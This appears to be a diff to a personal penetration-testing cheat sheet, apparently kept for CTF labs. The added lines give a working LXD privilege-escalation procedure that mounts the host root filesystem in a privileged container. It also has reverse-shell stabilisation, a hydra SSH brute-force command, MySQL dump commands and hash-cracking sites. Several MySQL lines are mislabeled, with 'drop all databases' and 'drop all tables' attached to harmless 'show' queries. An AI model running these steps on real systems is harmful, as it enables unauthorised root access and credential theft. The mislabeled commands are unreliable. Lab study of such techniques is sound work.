@@ -168,6 +168,25 @@
 - https://payatu.com/guide-linux-privilege-escalation
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation
 
+### Privesc with LXD
+- check if the user is member of lxd group: `id`
+- on attacking machine:
+    - Download build-alpine on your local machine via the git repository (https://github.com/lxd-images/alpine-3-7-apache-php5-6)
+    - Execute the script "build -alpine" that will build the latest Alpine image as a compressed file. This must be executed by the root user.
+    - Transfer this newly created tar file to the victim machine
+- on victim machine:
+    - Download the alpine image
+    - Import image for lxd
+    - Initialize the image inside a new container <- Worth checking the already imported/available images as you may be able to skip to this step
+    - Mount the container inside the /root directory
+- check what images are readily available on the machine: `lxc image list`
+- `lxc init IMAGENAME CONTAINERNAME -c security.privileged=true` (containername can be anything)
+- `lxc config device add CONTAINERNAME DEVICENAME disk source=/ path=/mnt/root recursive=true` (devicenam can also be anything)
+- `lxc start CONTAINERNAME`
+- `lxc exec CONTAINERNAME /bin/sh`
+- mount storage and verity root escalation: `id` and `cd /mnt/root/root`
+- more info here: https://www.hackingarticles.in/lxd-privilege-escalation/
+
 ### Useful privesc scripts
 - LinEnum.sh, download: https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 - LinPEAS
@@ -210,10 +229,11 @@
 
 ## Reverse Shells
 - Pentestmonkey reverse shell cheatsheet
-- `python -c ‘import pty;pty.spawn(“/bin/bash”);’`
-- Crtl Z (process to background)
-- `stty raw -echo`
-- Then foreground
+- `python3 -c 'import pty;pty.spawn("/bin/bash")'`
+- `export TERM=xterm`
+- Background: `Ctrl + Z`
+- `stty raw -echo; fg`
+- Note that if the shell dies, any input in your own terminal will not be visible. To fix this, type `reset` and press enter.
 
 ## SSH Brute Force
 - `hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.3.11 ssh`
@@ -337,7 +357,12 @@ Some other important instructions:
 - Useful tool without using Metasploit: `smtp-user-enum`
 
 ### MySQL
-- connect: `mysql -h [IP] -u [username] -p`
+- connect remotely (dangerous): `mysql -h [IP] -u [username] -p`
+- connect locally: `mysql -uUSERNAME -p`
+- drop all databases: `show databases;`
+- enter a db: `use DATABASE;`
+- dump the table contents: `SELECT * FROM TABLE;`
+- drop all tables in db: `show tables;`
 - enumerate with Metasploit: `auxiliary/admin/mysql/mysql_sql`
 - dump databases and tables: `auxiliary/scanner/mysql/mysql_schemadump`
 - dump (password) hashes: `auxiliary/scanner/mysql/mysql_hashdump`
@@ -360,3 +385,8 @@ Some other important instructions:
 - get request: `curl http://10.10.171.117:8081/ctf/get`
 - post request with data in body: `curl -X POST --data "flag_please" http://10.10.171.117:8081/ctf/post`
 - post request with headers: `curl -X POST -F 'name=linuxize' -F 'email=linuxize@example.com' https://example.com/contact.php`
+
+### Password cracking websites
+- https://crackstation.net/
+- https://md5decrypt.net/en/
+- https://hashes.com/en/decrypt/hash
